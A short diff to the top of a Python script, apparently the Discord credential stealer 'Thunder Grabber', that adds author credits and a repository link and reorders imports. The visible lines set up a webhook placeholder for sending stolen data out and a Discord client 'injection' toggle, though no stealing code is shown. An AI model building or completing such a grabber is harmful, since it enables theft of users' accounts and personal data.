@@ -1,8 +1,11 @@
-import base64, codecs
+#Thunder Grabber Made BY TWISTX7#9122
+#https://github.com/TWIST-X7/Thunder-Grabber
+
+import base64
+import codecs
 import requests
 import os
 import json
-import base64
 import winreg
 import shutil
 import psutil
@@ -23,6 +26,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 from getmac import get_mac_address as gma
 
 weblink = "YOUR_WEBHOOK"
+#The injection Was Mad By Rdimo#6968
 injection = "YES_NO"
 
 
